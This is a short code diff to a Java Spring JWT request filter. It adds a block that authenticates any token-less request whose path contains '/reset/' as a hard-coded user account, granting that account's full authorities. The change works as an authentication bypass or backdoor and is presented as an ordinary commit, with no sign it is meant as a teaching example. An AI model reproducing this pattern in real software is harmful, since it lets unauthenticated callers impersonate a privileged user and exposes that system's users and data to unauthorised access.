@@ -53,6 +53,14 @@ public class JwtRequestFilter extends OncePerRequestFilter {
                 }
             }
 
+            // Check if the request path is "/reset/" and bypass the filter
+            if (email == null && request.getServletPath().contains("/reset/")) {
+                UserDetails userDetails = this.jwtUserDetailsService.loadUserByUsername("pms@alnaasan.de");
+                UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
+                authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
+                SecurityContextHolder.getContext().setAuthentication(authentication);
+            }
+
             filterChain.doFilter(request, response);
         } catch (ExpiredJwtException ex) {
             JwtResponseError jwtResponseError = new JwtResponseError(
